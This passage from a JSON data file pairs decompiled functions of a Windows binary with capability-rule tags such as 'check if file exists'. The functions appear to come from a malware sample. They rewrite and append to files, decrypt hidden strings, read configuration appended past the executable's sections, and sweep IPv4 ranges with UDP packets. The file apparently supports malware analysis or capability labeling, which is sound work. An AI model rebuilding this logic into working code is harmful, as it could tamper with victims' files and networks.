- uStack272;\n                    iStack312 = iStack312 + iVar2;\n                    do {\n                        if (puVar5 != NULL) {\n                            *puVar5 = 0x20;\n                            puVar5 = puVar5 + 1;\n                        }\n                        iVar2 = iVar2 + -1;\n                        puStack308 = puVar5;\n                    } while (iVar2 != 0);\n                }\n            }\n            else {\n                if (puVar5 != NULL) {\n                    *puVar5 = *arg_ch;\ncode_r0x00408b0b:\n                    puVar5 = puVar5 + 1;\n                    puStack308 = puVar5;\n                }\ncode_r0x00408b10:\n                arg_ch = arg_ch + 1;\n                iStack312 = iStack312 + 1;\n            }\ncode_r0x00408cea:\n        } while (*arg_ch != 0);\n        if ((iStack312 != 0) && (arg_8h != NULL)) {\n            arg_8h[iStack312] = 0;\n        }\n    }\n    return iStack312;\n}\n",
        "token_count": 1962
    },
    "00401418": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00401418(uint arg_8h, uint arg_ch, uint s2, int32_t arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint16_t uVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    char cVar4;\n    int16_t iVar5;\n    uint32_t uVar6;\n    uint arg_8h_00;\n    int32_t iVar7;\n    uint uVar8;\n    uint *arg_ch_00;\n    uint var_78h;\n    uint uStack118;\n    uint uStack114;\n    uint uStack110;\n    uint uStack106;\n    ushort uStack102;\n    uint var_5ch;\n    uint32_t var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint32_t var_40h;\n    int32_t var_3ch;\n    uint32_t var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint *var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    int32_t *var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint var_2h;\n    \n    var_8h = 0;\n    var_2h._0_1_ = 0;\n    uVar6 = (**0x41342c)(arg_8h, 0xc0000000, 0, 0, 3, 0, 0);\n    var_ch = uVar6;\n    if (uVar6 == 0xffffffff) goto code_r0x004017a7;\n    (**0x413420)(uVar6, &var_40h);\n    if ((*0x433594 <= var_3ch) && ((*0x433594 < var_3ch || (*0x433590 <= var_40h)))) {\n        while( true ) {\n            var_78h._0_2_ = 0;\n            stack0xffffff86 = 0;\n            uStack118 = 0;\n            uStack114 = 0;\n            uStack110 = 0;\n            uStack106 = 0;\n            uStack102 = 0;\n            fcn.00408177(0xf);\n            uVar8 = arg_ch;\n            arg_8h_00 = fcn.00407c34(0x411d04, 8, 0x7cab4819, arg_ch, &var_78h, 0x433c88);\n            fcn.00407df0(arg_8h_00, uVar8);\n            iVar7 = fcn.004067d6(var_8h);\n            if (iVar7 == 0) break;\n            fcn.00406d25();\n            var_8h = 0;\n        }\n        var_10h = 0;\n        var_2h._1_1_ = 0;\n        var_38h = *0x4335a0;\n        var_34h = 0;\n        var_58h = var_40h - *0x4335a8;\n        iVar7 = (var_3ch - *0x4335ac) - (var_40h < *0x4335a8);\n        if ((iVar7 < 0) || ((iVar7 < 1 && (var_58h <= var_38h)))) {\n            var_40h = var_40h & 0xffff;\n        }\n        else {\n            uVar6 = (var_40h - var_38h) - *0x4335a8;\n            iVar7 = ((var_3ch - (var_40h < var_38h)) - *0x4335ac) - (var_40h - var_38h < *0x4335a8);\n            var_10h = *0x4335a4;\n            var_40h = *0x4335a0;\n            if ((iVar7 < 1) && ((iVar7 < 0 || (uVar6 < *0x4335a4)))) {\n                var_10h = uVar6;\n            }\n            var_2h._1_1_ = 1;\n        }\n        var_14h = NULL;\n        if (var_2h._1_1_ == 0) {\ncode_r0x0040156d:\n            (**0x413374)(var_ch, &var_48h, &var_50h, &var_58h);\n            uVar6 = *0x433598;\n            (**0x4134c0)(var_ch, *0x4335a8, *0x4335ac, 0, 0);\n            var_18h = var_40h;\n            (**0x413440)(var_ch, uVar6 + 0x17 + arg_14h, var_40h, &var_34h, 0);\n            *(arg_14h + 8) = var_2h._1_1_;\n            *(arg_14h + 9) = var_10h;\n            *(arg_14h + 0xf) = *0x4335a8;\n            iVar5 = (**0x4133a4)(s2);\n            *(arg_14h + 6) = iVar5 * 2;\n            *(arg_14h + 0xd) = var_40h;\n            uVar8 = fcn.0040fdc1(var_18h);\n            var_1ch = arg_14h + 0x17;\n            *(arg_14h + 0x11) = uVar8;\n            fcn.00406252();\n            var_24h = *(arg_14h + 6) + 0x18 + var_2h._1_1_ * 8;\n            arg_ch_00 = fcn.00406c7f();\n            var_2ch = arg_ch_00;\n            if (arg_ch_00 != NULL) {\n                arg_ch_00[1] = var_44h;\n                *arg_ch_00 = var_48h;\n                arg_ch_00[3] = var_4ch;\n                arg_ch_00[2] = var_50h;\n                arg_ch_00[5] = var_54h;\n                arg_ch_00[4] = var_58h;\n                sub.ntdll.dll_memcpy(arg_ch_00 + 6, s2, *(arg_14h + 6));\n                var_28h = *0x433580;\n                var_30h = fcn.00410067(*0x4335b0, arg_14h, &var_28h);\n                piVar2 = var_14h;\n                if (var_30h != 0) {\n                    var_5ch = 0;\n                    uVar6 = *var_14h * var_10h + var_18h;\n                    cVar4 = fcn.004012b6(var_ch, var_1ch, var_10h, arg_1ch, var_14h, uVar6 + *0x4335a8, \n                                         (var_18h >> 0x1f) + CARRY4(*var_14h * var_10h, var_18h) + *0x4335ac +\n                                         CARRY4(uVar6, *0x4335a8));\n                    if (cVar4 != '\\0') {\n                        uVar1 = *(arg_14h + 6);\n                        *(uVar1 + 0x18 + arg_ch_00) = *piVar2;\n                        *(uVar1 + 0x1c + arg_ch_00) = piVar2[1];\n                        fcn.0040fe15(var_1ch, arg_ch_00, 0);\n                        uVar3 = var_ch;\n                        (**0x4134c0)(var_ch, *0x4335a8, *0x4335ac, 0, 0);\n                        uVar6 = var_18h;\n                        fcn.00406252();\n                        (**0x413498)(uVar3, arg_18h, uVar6, &var_10h, 0);\n                        var_20h = 0;\n                        var_1ch = 0;\n                        (**0x4134c0)(uVar3, 0, 0, 0, 2);\n                        (**0x413498)(uVar3, var_2ch, var_24h, &var_10h, 0);\n                        (**0x413498)(uVar3, var_30h, var_28h, &var_10h, 0);\n                        (**0x413498)(uVar3, *0x43359c, *0x43358c, &var_10h, 0);\n                        var_2h._0_1_ = 1;\n                    }\n                    fcn.00406d25();\n                }\n                fcn.00406d25();\n            }\n        }\n        else {\n            var_14h = fcn.00406c7f();\n            if (var_14h != NULL) {\n                *var_14h = 0;\n                goto code_r0x0040156d;\n            }\n        }\n        fcn.00406d25();\n    }\n    uVar6 = (**0x4134e8)(var_ch);\ncode_r0x004017a7:\n    if (var_8h != 0) {\n        if (var_2h != 0) {\n            iVar7 = (**0x41341c)(arg_8h, var_8h);\n            var_2h._0_1_ = iVar7 != 0;\n        }\n        uVar6 = fcn.00406d25();\n    }\n    return uVar6 & 0xffffff00 | var_2h;\n}\n",
        "token_count": 2267
    },
    "00401d88": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401d88(uint arg_8h)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint var_23ch;\n    uint var_34h;\n    uint var_30h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_8h;\n    \n    puVar6 = &var_30h;\n    for (iVar5 = 7; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    var_34h = arg_8h;\n    cVar1 = fcn.00402699(arg_8h);\n    if (cVar1 != '\\0') {\n        fcn.004065cb();\n        uVar2 = fcn.00407c34(0x411dd4, 0xc, 0x94a3dd8f, 0x4339b8);\n        (**0x413088)(&var_23ch, uVar2);\n        iVar5 = (**0x41342c)(&var_23ch, 0x40000000, 1, 0, 4, 0, 0);\n        var_8h = iVar5;\n        if (iVar5 != -1) {\n            var_14h = 0;\n            var_10h = 0;\n            (**0x4134c0)(iVar5, 0, 0, 0, 2);\n            while (in_EAX != NULL) {\n                iVar3 = fcn.0040e2b9(0);\n                if (iVar3 == 0) {\n                    uVar2 = fcn.00407c34(0x411de4, 0x23, 0xefb2596b, 0x46);\n                    (**0x413498)(iVar5, uVar2);\n                }\n                else {\n                    iVar4 = (**0x4133a4)(iVar3, &var_10h, 0);\n                    (**0x413498)(iVar5, iVar3, iVar4 * 2);\n                    uVar2 = fcn.00407c1d(0x411e08, 4, 0x58394be2, 4, &var_10h, 0);\n                    (**0x413498)(iVar5, uVar2);\n                    fcn.00406d25();\n                    in_EAX = *in_EAX;\n                    iVar5 = var_8h;\n                }\n            }\n            (**0x4134e8)(iVar5);\n        }\n        var_8h = (**0x4134a0)();\n        uVar2 = fcn.00407c34(0x411e10, 0x14, 0x2c7ee69d);\n        fcn.00402664(arg_8h, uVar2);\n    }\n    fcn.00409410();\n    (**0x4133e4)(&var_30h);\n    iVar5 = 1;\n    if (*0x433588 != '\\0') {\n        iVar5 = fcn.00409055();\n        iVar5 = iVar5 * *0x433584;\n    }\n    for (; iVar5 != 0; iVar5 = iVar5 + -1) {\n        fcn.004094ec(fcn.00401802, &var_34h);\n    }\n    fcn.004094f1();\n    fcn.0040952e();\n    iVar5 = (**0x4134a0)();\n    cVar1 = fcn.00402699(arg_8h);\n    if (cVar1 != '\\0') {\n        uVar2 = fcn.00407c34(0x411e28, 0x20, 0xc3667a87, iVar5 - var_8h);\n        fcn.00402664(arg_8h, uVar2);\n    }\n    (**0x4133ec)(&var_30h);\n    return;\n}\n",
        "token_count": 926
    },
    "00401f74": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00401f74(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint32_t uVar4;\n    int32_t unaff_EDI;\n    uint arg_ch_00;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.004065cb();\n    uVar4 = 0;\n    arg_ch_00 = 0x4339b8;\n    arg_8h_00 = fcn.00407c34(0x411e4c, 9, 0xd017d5fa, 0x4339b8, arg_8h);\n    uVar1 = fcn.00407df0(arg_8h_00, arg_ch_00);\n    if (uVar1 != 0) {\n        iVar2 = (**0x41342c)(in_ECX, 0x40000000, 1, 0, 2, 0, 0);\n        if (iVar2 != -1) {\n            iVar3 = (**0x413498)(iVar2, arg_ch);\n            if ((iVar3 != 0) && (unaff_EDI == in_ECX)) {\n                uVar4 = 1;\n            }\n            (**0x413424)(iVar2);\n            (**0x4134e8)(iVar2);\n        }\n        uVar1 = fcn.00406d25();\n    }\n    return uVar1 & 0xffffff00 | uVar4;\n}\n",
        "token_count": 363
    },
    "00402037": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402037(uint arg_8h, int32_t *arg_ch)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint arg_ch_00;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    arg_ch_00 = 0x4339b8;\n    iVar3 = 0;\n    arg_8h_00 = fcn.00407c34(0x411e4c, 9, 0xd017d5fa, 0x4339b8, arg_8h);\n    iVar1 = fcn.00407df0(arg_8h_00, arg_ch_00);\n    if (iVar1 != 0) {\n        var_4h = (**0x41342c)(var_8h, 0x80000000, 1, 0, 3, 0, 0);\n        if (var_4h != -1) {\n            iVar1 = (**0x4134c8)(var_4h, 0);\n            if (arg_ch != NULL) {\n                *arg_ch = iVar1;\n            }\n            iVar3 = fcn.00406c7f();\n            if (iVar3 != 0) {\n                iVar2 = (**0x413440)(var_4h, iVar3, iVar1, &var_ch, 0);\n                if ((iVar2 == 0) || (iVar1 != var_ch)) {\n                    fcn.00406d25();\n                    iVar3 = 0;\n                }\n                else {\n                    *(iVar1 + iVar3) = 0;\n                }\n            }\n            (**0x4134e8)(var_4h);\n        }\n        fcn.00406d25();\n    }\n    return iVar3;\n}\n",
        "token_count": 418
    },
    "004065cb": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.004065cb(void)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    int16_t *piVar3;\n    uint32_t uVar4;\n    \n    cVar2 = fcn.00408e22(0x4339b8);\n    if (cVar2 == '\\0') {\n        return 0;\n    }\n    piVar3 = (**0x413144)(0x4339b8);\n    if (piVar3 == NULL) {\n        piVar3 = 0x4339b8;\n    }\n    do {\n        iVar1 = *piVar3;\n        if (((iVar1 == 0x5c) || (iVar1 == 0x2f)) || (iVar1 == 0)) {\n            *piVar3 = 0;\n            uVar4 = (**0x413428)(0x4339b8);\n            if (uVar4 == 0xffffffff) {\n                uVar4 = (**0x413490)(0x4339b8, 0);\n            }\n            else {\n                uVar4 = uVar4 & 0x10;\n            }\n            if (uVar4 == 0) {\n                return 0;\n            }\n            if (iVar1 == 0) {\n                return 1;\n            }\n            *piVar3 = iVar1;\n        }\n        piVar3 = piVar3 + 1;\n    } while( true );\n}\n",
        "token_count": 313
    },
    "004067d6": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool fcn.004067d6(uint param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    cVar1 = fcn.00408e22(param_1);\n    if (cVar1 == '\\0') {\n        return false;\n    }\n    iVar2 = (**0x413428)(param_1);\n    return iVar2 != -1;\n}\n",
        "token_count": 85
    },
    "00406da8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.00406da8(uint param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint unaff_retaddr;\n    \n    iVar1 = (**0x413004)(param_1);\n    if (iVar1 == -1) {\n        iVar2 = (**0x413018)(unaff_retaddr);\n        if (iVar2 != 0) {\n            iVar1 = ***(iVar2 + 0xc);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 111
    },
    "00409daa": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00409daa(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t *puVar3;\n    uint uVar4;\n    uchar *puVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    int64_t iVar9;\n    uint var_50h;\n    uint var_30h;\n    uchar uStack47;\n    uint var_28h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = (**0x41342c)(0x433628, 0x80000000, 1, 0, 3, 0, 0);\n    if (var_4h != -1) {\n        var_20h = (**0x4133dc)(var_4h, 0, 2, 0, 0, 0);\n        if (var_20h != 0) {\n            var_1ch = (**0x4133d4)(var_20h, 4, 0, 0, 0);\n            if (var_1ch != 0) {\n                iVar2 = *(var_1ch + 0x3c) + var_1ch;\n                uVar6 = *(iVar2 + 6);\n                uVar7 = 0;\n                uVar8 = 0;\n                if (*(iVar2 + 6) != 0) {\n                    puVar3 = *(iVar2 + 0x14) + iVar2 + 0x2c;\n                    do {\n                        uVar1 = *puVar3;\n                        if (uVar7 < uVar1) {\n                            uVar8 = puVar3[-1] + uVar1;\n                            uVar7 = uVar1;\n                        }\n                        puVar3 = puVar3 + 10;\n                        uVar6 = uVar6 - 1;\n                    } while (uVar6 != 0);\n                }\n                uVar7 = (**0x4134c8)(var_4h, 0);\n                if (uVar8 < uVar7) {\n                    (**0x4133d0)(var_4h, uVar7 - 5, 0, 0);\n                    iVar2 = (**0x413440)(var_4h, &var_28h, 5, &var_ch, 0);\n                    if ((iVar2 != 0) && (var_ch == 5)) {\n                        var_30h._0_1_ = 0;\n                        stack0xffffffcd = 0;\n                        uStack47 = 0;\n                        (**0x4133d0)(var_4h, uVar7 - 10, 0, 0);\n                        iVar2 = (**0x413440)(var_4h, &var_30h, 5, &var_ch, 0);\n                        if ((iVar2 != 0) && (var_ch == 5)) {\n                            fcn.00406390(&var_28h, 5, &var_30h, 5);\n                            var_8h = fcn.00407ab0();\n                            iVar2 = fcn.00406c7f();\n                            var_18h = iVar2;\n                            if (iVar2 != 0) {\n                                (**0x4133d0)(var_4h, (uVar7 - var_8h) + -10, 0, 0);\n                                (**0x413440)(var_4h, iVar2, var_8h, &var_ch, 0);\n                                fcn.00406390(&var_28h, 5, iVar2, var_8h);\n                                uVar4 = fcn.00407c1d(0x41227c, 6, 0x3d2215db);\n                                iVar2 = fcn.00409d6a(var_8h, uVar4);\n                                if (iVar2 != 0) {\n                                    iVar2 = iVar2 + 6;\n                                    uVar4 = fcn.00407c1d(0x41227c, 6, 0x3d2215db);\n                                    puVar5 = (**0x41316c)(iVar2, uVar4);\n                                    if (puVar5 != NULL) {\n                                        *puVar5 = 0;\n                                        uVar4 = fcn.00407c1d(0x412284, 0x19, 0xee8f31ec, var_8h, iVar2);\n                                        fcn.00402563(arg_8h, uVar4);\n                                        iVar2 = fcn.00402ec5(iVar2, puVar5 - iVar2, &var_8h);\n                                        if (iVar2 != 0) {\n                                            fcn.00407c1d(0x4122a0, 1, 0x332355bb);\n                                            fcn.00402cec();\n                                            fcn.00402e0b();\n                                            *0x433834 = fcn.00407c87();\n                                            fcn.00407c1d(0x4122a4, 1, 0x4059bb92);\n                                            var_14h = fcn.00402cec();\n                                            if (var_14h != 0) {\n                                                uVar7 = fcn.00402c8f();\n                                                if (uVar7 < 6) {\n                                                    *0x433838 = fcn.00402c8f();\n                                                }\n                                                else {\n                                                    *0x433838 = 5;\n                                                }\n                                                *0x433830 = fcn.00406c76();\n                                                var_10h = 0;\n                                                if (*0x433838 != 0) {\n                                                    do {\n                                                        fcn.00402cb6(var_10h);\n                                                        fcn.00402e0b();\n                                                        uVar4 = fcn.00407c87();\n                                                        *(*0x433830 + var_10h * 4) = uVar4;\n                                                        var_10h = var_10h + 1;\n                                                    } while (var_10h < *0x433838);\n                                                }\n                                            }\n                                            fcn.00407c1d(0x4122a8, 1, 0x4d629b73);\n                                            fcn.00402cec();\n                                            fcn.00402e0b();\n                                            *0x43383c = fcn.00407c87();\n                                            fcn.00407c1d(0x4122ac, 1, 0x20ac29f6);\n                                            fcn.00402cec();\n                                            *0x413a54 = fcn.00402da4();\n                                            fcn.00407c1d(0x4122b0, 7, 0x4ca19bbc);\n                                            fcn.00402cec();\n                                            iVar9 = fcn.00402da4();\n                                            if (iVar9 != 0) {\n                                                *0x413a50 = 0;\n                                            }\n                                            fcn.00402bc0();\n                                        }\n                                    }\n                                }\n                                fcn.00406d25();\n                            }\n                        }\n                    }\n                }\n                (**0x4133d8)(var_1ch);\n            }\n            (**0x4134e8)(var_20h);\n        }\n        (**0x4134e8)(var_4h);\n    }\n    fcn.00407c1d(0x4122b8, 7, 0x524fb7d3);\n    var_8h = fcn.00402cec();\n    if (var_8h != 0) {\n        if (*0x433834 == 0) {\n            fcn.00407c1d(0x4122c0, 3, 0xb918d1d5);\n            fcn.00402cec();\n            fcn.00402e0b();\n            *0x433834 = fcn.00407c87();\n        }\n        if (*0x433830 == 0) {\n            *0x433838 = 5;\n            *0x433830 = fcn.00406c76();\n            uVar7 = 1;\n            if (*0x433838 != 0) {\n                do {\n                    uVar4 = fcn.00407c1d(0x4122c4, 7, 0x28908b62, uVar7);\n                    (**0x413084)(&var_50h, uVar4);\n                    fcn.00402cec();\n                    fcn.00402e0b();\n                    uVar4 = fcn.00407c87();\n                    *(*0x433830 + -4 + uVar7 * 4) = uVar4;\n                    uVar7 = uVar7 + 1;\n                } while (uVar7 <= *0x433838);\n            }\n        }\n        else if ((*0x433838 < 5) && (*0x433830 = fcn.00406c8c(),  *0x433838 < 5)) {\n            iVar2 = *0x433838 << 2;\n            var_ch = *0x433838 + 1;\n            do {\n                uVar4 = fcn.00407c1d(0x4122c4, 7, 0x28908b62, var_ch);\n                (**0x413084)(&var_50h, uVar4);\n                fcn.00402cec();\n                fcn.00402e0b();\n                uVar4 = fcn.00407c87();\n                *0x433838 = *0x433838 + 1;\n                var_ch = var_ch + 1;\n                *(iVar2 + *0x433830) = uVar4;\n                iVar2 = iVar2 + 4;\n            } while (var_ch < 6);\n        }\n        if (*0x43383c == 0) {\n            fcn.00407c1d(\"xuXC\", 4, 0x70896d81);\n            fcn.00402cec();\n            fcn.00402e0b();\n            *0x43383c = fcn.00407c87();\n        }\n    }\n    return;\n}\n",
        "token_count": 2306
    },
    "0040a437": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0040a437(uint arg_8h, uint arg_ch)\n\n{\n    ushort uVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint *arg_ch_00;\n    uint var_128h;\n    uint var_c0h;\n    uint var_54h;\n    uint var_44h;\n    uint32_t var_40h;\n    uint var_3ch;\n    uint32_t var_38h;\n    ushort var_34h;\n    uint var_32h;\n    uint8_t var_2eh;\n    uint8_t var_2dh;\n    ushort uStack48;\n    uint uStack46;\n    ushort uStack42;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uint var_5h;\n    uint var_1h;\n    \n    var_5h._0_1_ = 0;\n    fcn.00407c1d(0x4122f4, 7, 0x215a99ac);\n    var_40h = fcn.00402cec();\n    if (var_40h != 0) {\n        fcn.00407c1d(0x4122fc, 10, 0xe11e2f1e);\n        var_40h = fcn.00402cec();\n        if (var_40h != 0) {\n            fcn.00407c1d(0x412308, 7, 0x4b577727);\n            fcn.00402cec();\n            var_24h = fcn.00402da4();\n            var_10h = 0;\n            if (var_24h == 0) {\n                var_24h = -1;\n            }\n            fcn.00402cec();\n            uVar2 = fcn.00402e0b();\n            var_40h = fcn.00401127(uVar2);\n            if (var_40h != 0) {\n                var_14h = fcn.0040a9dc(&var_10h);\n                if (var_14h != 0) {\n                    (**0x4130a0)(var_14h, var_10h);\n                    fcn.0040fc0e(var_14h, var_10h, &var_54h);\n                    uVar3 = var_54h;\n                    uVar2 = fcn.00407c1d(0x412310, 4, 0x2f18c314);\n                    var_10h = fcn.00407eb0(var_10h, uVar2, uVar3);\n                    (**0x4130a0)(var_14h, var_10h);\n                    fcn.00407c1d(0x412318, 4, 0x182f4a43);\n                    fcn.00402cec();\n                    uVar1 = fcn.00402da4();\n                    var_32h._0_2_ = 0;\n                    var_32h._2_1_ = 0;\n                    var_32h._3_1_ = 0;\n                    var_2eh = 0;\n                    var_2dh = 0;\n                    uStack48 = 0;\n                    uStack46 = 0;\n                    uStack42 = 0;\n                    var_34h = 2;\n                    var_32h._0_2_ = (**0x413020)(uVar1);\n                    var_20h = (**0x413000)(2, 2, 0x11);\n                    if (var_20h != -1) {\n                        fcn.00407c1d(0x412320, 2, 0xa3edc6ca);\n                        var_44h = fcn.00402cec();\n                        var_38h = fcn.00402c8f();\n                        var_18h = 0;\n                        if (var_38h != 0) {\n                            do {\n                                arg_ch_00 = &var_c0h;\n                                uVar2 = fcn.00407c1d(0x412324, 0xb, 0xa022f81a, arg_ch_00, &var_128h, &var_3ch);\n                                fcn.00402cb6(var_18h);\n                                fcn.00402e0b();\n                                fcn.00408010(uVar2, arg_ch_00);\n                                uVar3 = fcn.00406df5();\n                                uVar4 = fcn.00406da8(&var_c0h);\n                                uVar4 = uVar4 & uVar3;\n                                var_ch = ~uVar3 | uVar4;\n                                iVar6 = 0;\n                                var_1h._0_1_ = uVar4;\n                                var_1ch = uVar4;\n                                if (var_1h <= var_ch) {\n                                    do {\n                                        var_5h._3_1_ = uVar4 >> 8;\n                                        if (var_5h._3_1_ <= var_ch._1_1_) {\n                                            do {\n                                                while (var_5h._1_1_ = var_1ch._2_1_,  var_1ch._2_1_ <= var_ch._2_1_) {\n                                                    iVar5 = iVar6;\n                                                    while (iVar6 = iVar5,  var_5h._2_1_ = var_1ch._3_1_, \n                                                          var_1ch._3_1_ <= var_ch._3_1_) {\n                                                        var_32h._2_1_ = var_1h;\n                                                        var_32h._3_1_ = var_5h._3_1_;\n                                                        var_2eh = var_5h._1_1_;\n                                                        iVar6 = iVar5 + 1;\n                                                        var_2dh = var_1ch._3_1_;\n                                                        if (iVar5 == var_24h) {\n                                                            iVar6 = 0;\n                                                            (**0x41347c)(1000);\n                                                        }\n                                                        uVar2 = fcn.00406dd3(CONCAT13(var_2dh, CONCAT12(var_2eh, \n                                                            CONCAT11(var_32h._3_1_, var_32h._2_1_))), var_14h);\n                                                        uVar2 = fcn.00407c1d(0x412330, 0x13, 0x5987a65b, uVar2);\n                                                        fcn.00402563(arg_8h, uVar2);\n                                                        iVar5 = (**0x41301c)(var_20h, var_14h, var_10h, 0, &var_34h, \n                                                                             0x10);\n                                                        if (iVar5 == var_10h) {\n                                                            var_5h._0_1_ = 1;\n                                                        }\n                                                        if (var_5h._2_1_ == 0xff) break;\n                                                        iVar5 = iVar6;\n                                                        var_1ch._3_1_ = var_5h._2_1_ + 1;\n                                                    }\n                                                    if (var_5h._1_1_ == 0xff) break;\n                                                    var_1ch._2_1_ = var_5h._1_1_ + 1;\n                                                }\n                                            } while ((var_5h._3_1_ != 0xff) &&\n                                                    (var_5h._3_1_ = var_5h._3_1_ + 1,  var_5h._3_1_ <= var_ch._1_1_));\n                                        }\n                                    } while ((var_1h != 0xff) && (var_1h._0_1_ = var_1h + 1,  var_1h <= var_ch));\n                                }\n                                var_18h = var_18h + 1;\n                            } while (var_18h < var_38h);\n                        }\n                        fcn.00406dde(var_20h);\n                    }\n                    fcn.00406d25();\n                }\n                var_40h = fcn.00406d25();\n            }\n        }\n    }\n    return var_40h & 0xffffff00 | var_5h;\n}\n",
        "token_count": 1893
    },
    "0040a7a5": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.0040a7a5(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    \n    if (((*0x413a5c == -1) && (*0x413a5c = 0,  *0x4345a0 == 2)) && (4 < *0x434594)) {\n        if (*0x434594 < 6) {\n            if (*0x434594 == 5) {\n                if (*0x434598 == 2) {\n                    iVar2 = (**0x4130a4)(0x59);\n                    if (((iVar2 != 0) || (*0x4346a8 == 0x2000)) ||\n                       ((*0x4346aa != '\\x01' || (iVar2 = fcn.00409029(),  iVar2 == 0)))) {\n                        *0x413a5c = 1;\n                        return 1;\n                    }\n                }\n                else if (*0x434598 != 1) {\n                    *0x413a5c = 0;\n                    return 0;\n                }\n                *0x413a5c = 5;\n            }\n        }\n        else if (*0x434594 == 10) {\n            *0x413a5c = 10;\n        }\n        else if (*0x434598 == 0) {\n            *0x413a5c = (*0x4346aa == '\\x01') * 4 + 2;\n        }\n        else if (*0x434598 == 1) {\n            *0x413a5c = ((*0x4346aa != '\\x01') - 1 & 5) + 2;\n        }\n        else {\n            if (*0x434598 == 2) {\n                uVar1 = (*0x4346aa != '\\x01') - 1 & 5;\n            }\n            else {\n                if (*0x434598 != 3) {\n                    *0x413a5c = 0;\n                    return 0;\n                }\n                uVar1 = (*0x4346aa != '\\x01') - 1 & 6;\n            }\n            *0x413a5c = uVar1 + 3;\n        }\n    }\n    return *0x413a5c;\n}\n",
        "token_count": 504
    },
    "0040bb89": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
